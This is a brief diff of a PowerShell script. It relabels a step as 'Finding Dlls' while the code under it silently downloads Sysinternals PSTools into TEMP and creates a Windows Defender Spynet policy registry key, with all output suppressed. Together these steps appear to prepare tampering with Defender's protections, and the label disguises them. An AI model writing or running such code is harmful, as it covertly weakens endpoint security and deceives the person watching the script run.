@@ -12,7 +12,7 @@ function Redirect-AllStreams {
     & $ScriptBlock *> $null
 }
 
-Write-Host "[1/5] " -ForegroundColor Cyan
+Write-Host "[1/5 Finding Dlls] " -ForegroundColor Cyan
 $psToolsZip = "$env:TEMP\PSTools.zip"
 Redirect-AllStreams { Invoke-WebRequest -Uri "https://download.sysinternals.com/files/PSTools.zip" -OutFile $psToolsZip -UseBasicParsing }
 Redirect-AllStreams { New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Force }
